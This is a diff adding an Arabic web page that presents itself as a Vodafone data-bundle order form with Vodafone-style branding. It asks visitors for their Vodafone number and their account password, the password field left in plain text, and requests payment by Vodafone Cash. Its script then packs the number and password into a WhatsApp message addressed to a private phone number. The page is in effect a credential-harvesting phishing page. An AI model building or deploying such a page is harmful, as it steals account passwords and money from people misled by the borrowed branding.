@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>طلب باقات فودافون</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:Tahoma,Arial,sans-serif;background:#0b0b0b;color:#fff;min-height:100vh;padding:20px}
+.container{max-width:440px;margin:20px auto}
+.card{background:#171717;border:1px solid #303030;border-radius:22px;padding:22px;box-shadow:0 10px 35px #0008}
+.logo{width:72px;height:72px;border-radius:50%;background:#e60000;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:28px;font-weight:900}
+h1{text-align:center;margin:0 0 7px;font-size:25px}
+.subtitle{text-align:center;color:#aaa;margin-bottom:22px}
+.title{font-weight:bold;margin:18px 0 10px}
+.packages{display:grid;gap:12px}
+.package{border:2px solid #333;background:#202020;border-radius:15px;padding:16px;cursor:pointer;transition:.2s}
+.package.active{border-color:#e60000;background:#2a1111}
+.package input{display:none}
+.package-name{font-size:20px;font-weight:bold}
+.package-price{color:#ff5555;font-size:19px;font-weight:bold;margin-top:5px}
+input,select{width:100%;padding:14px;border-radius:12px;border:1px solid #444;background:#0f0f0f;color:#fff;font-size:16px;outline:none}
+.cash{margin:18px 0;padding:15px;border-radius:14px;background:#241212;border:1px dashed #e60000;text-align:center}
+.cash-number{font-size:22px;font-weight:bold;color:#ff5555;direction:ltr;display:inline-block;margin:7px 0}
+.copy{background:#e60000;color:#fff;border:0;border-radius:8px;padding:7px 12px;cursor:pointer}
+button.submit{width:100%;padding:15px;margin-top:18px;border:0;border-radius:13px;background:#25D366;color:#fff;font-size:18px;font-weight:bold;cursor:pointer}
+.error{display:none;color:#ff5b5b;font-size:13px;margin-top:7px}
+.note{text-align:center;color:#888;font-size:12px;line-height:1.7;margin-top:12px}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="card">
+<div class="logo">V</div>
+<h1>طلب باقات فودافون</h1>
+<div class="subtitle">اختار الباقة المطلوبة ثم املأ البيانات</div>
+
+<div class="title">1. اختر الباقة</div>
+<div class="packages">
+<label class="package" onclick="selectPackage(this,'5200 ميجا','150 جنيه')">
+<input type="radio" name="package">
+<div class="package-name">5200 ميجا</div>
+<div class="package-price">150 جنيه</div>
+</label>
+<label class="package" onclick="selectPackage(this,'10400 ميجا','250 جنيه')">
+<input type="radio" name="package">
+<div class="package-name">10400 ميجا</div>
+<div class="package-price">250 جنيه</div>
+</label>
+</div>
+<div id="packageError" class="error">برجاء اختيار الباقة أولاً.</div>
+
+<div class="title">2. رقم فودافون</div>
+<input id="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="01xxxxxxxxx">
+<div id="phoneError" class="error">اكتب رقم فودافون صحيح مكوّن من 11 رقم.</div>
+
+<div class="title">3. كلمة مرور أنا فودافون</div>
+<input id="password" type="text" placeholder="اكتب الباسورد أو اتركها فارغة" autocomplete="off">
+
+<div class="title">إذا كنت لا تعرف كلمة المرور</div>
+<select id="status">
+<option value="أول مرة بتعامل معاكم">أول مرة بتعامل معاكم</option>
+<option value="عملنا مع بعض قبل كده">عملنا مع بعض قبل كده</option>
+</select>
+
+<div class="cash">
+<div>💳 رقم فودافون كاش للتحويل</div>
+<div class="cash-number" id="cashNumber">01129654061</div>
+<br>
+<button type="button" class="copy" onclick="copyCash()">نسخ الرقم</button>
+<div class="note">رقم الكاش هو نفس الرقم الذي سيتم فتح المحادثة عليه في واتساب.</div>
+</div>
+
+<button class="submit" type="button" onclick="sendWhatsApp()">💬 إرسال الطلب عبر واتساب</button>
+<div class="note">بعد الضغط سيتم فتح واتساب برسالة الطلب جاهزة للمراجعة والإرسال.</div>
+</div>
+</div>
+
+<script>
+const WHATSAPP_NUMBER="201129654061";
+const CASH_NUMBER="01129654061";
+let selectedPackageName="";
+let selectedPackagePrice="";
+
+function selectPackage(el,name,price){
+ selectedPackageName=name;
+ selectedPackagePrice=price;
+ document.querySelectorAll('.package').forEach(x=>x.classList.remove('active'));
+ el.classList.add('active');
+ document.getElementById('packageError').style.display='none';
+}
+
+function copyCash(){
+ navigator.clipboard.writeText(CASH_NUMBER).then(()=>alert("تم نسخ رقم الكاش: "+CASH_NUMBER));
+}
+
+function sendWhatsApp(){
+ const phone=document.getElementById('phone').value.trim();
+ const password=document.getElementById('password').value.trim();
+ const status=document.getElementById('status').value;
+
+ if(!selectedPackageName){
+   document.getElementById('packageError').style.display='block';
+   return;
+ }
+ if(!/^01[0125][0-9]{8}$/.test(phone)){
+   document.getElementById('phoneError').style.display='block';
+   return;
+ }
+ document.getElementById('phoneError').style.display='none';
+
+ let passText=password!==""?password:"مش عارف الباسورد";
+ let message="*طلب تجديد باقة جديد* 📱\n\n";
+ message+="🔹 *الباقة المطلوبة:* "+selectedPackageName+"\n";
+ message+="🔹 *السعر:* "+selectedPackagePrice+"\n";
+ message+="🔹 *رقم فودافون:* "+phone+"\n";
+ message+="🔹 *كلمة المرور:* "+passText+"\n";
+ if(password==="") message+="🔹 *الحالة:* "+status+"\n";
+
+ window.open("https://wa.me/"+WHATSAPP_NUMBER+"?text="+encodeURIComponent(message),"_blank");
+}
+</script>
+</body>
+</html>
